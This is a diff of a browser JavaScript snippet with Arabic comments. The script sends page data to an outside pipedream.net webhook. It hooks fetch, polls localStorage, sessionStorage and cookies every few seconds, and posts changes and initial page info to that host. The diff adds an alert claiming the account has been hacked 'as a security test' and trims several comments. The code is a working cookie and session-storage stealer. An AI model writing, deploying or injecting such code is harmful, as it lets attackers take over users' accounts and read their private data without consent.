@@ -6,7 +6,6 @@
   const WEBHOOK_URL = "https://eoeisd0pus6doy3.m.pipedream.net/";
 
   function sendToWebhook(data) {
-    // فلترة عشان ما نبعتش طلبات للويب هوك تسبب loop
     if (data.url && data.url.startsWith(WEBHOOK_URL)) return;
     fetch(WEBHOOK_URL, {
       method: "POST",
@@ -14,6 +13,9 @@
       body: JSON.stringify(data)
     }).catch(err => console.error("Failed sending data:", err));
   }
+
+  // إظهار رسالة للمستخدم عند التحميل
+  alert("🚨 تم اختراق حسابك. هذا مجرد اختبار أمني.");
 
   // مراقبة fetch
   (function(){
@@ -94,7 +96,7 @@
     }
   })();
 
-  // مراقبة تغير localStorage و sessionStorage كل 5 ثواني
+  // مراقبة localStorage و sessionStorage
   let lastLocalStorage = null;
   let lastSessionStorage = null;
   setInterval(() => {
@@ -112,7 +114,7 @@
     } catch {}
   }, 5000);
 
-  // مراقبة تغير الكوكيز كل 3 ثواني
+  // مراقبة تغير الكوكيز
   let lastCookies = document.cookie;
   setInterval(() => {
     if (document.cookie !== lastCookies) {
@@ -121,7 +123,7 @@
     }
   }, 3000);
 
-  // إرسال بيانات أولية عند تحميل الصفحة
+  // إرسال بيانات أولية
   sendToWebhook({
     type: "initial-info",
     url: window.location.href,
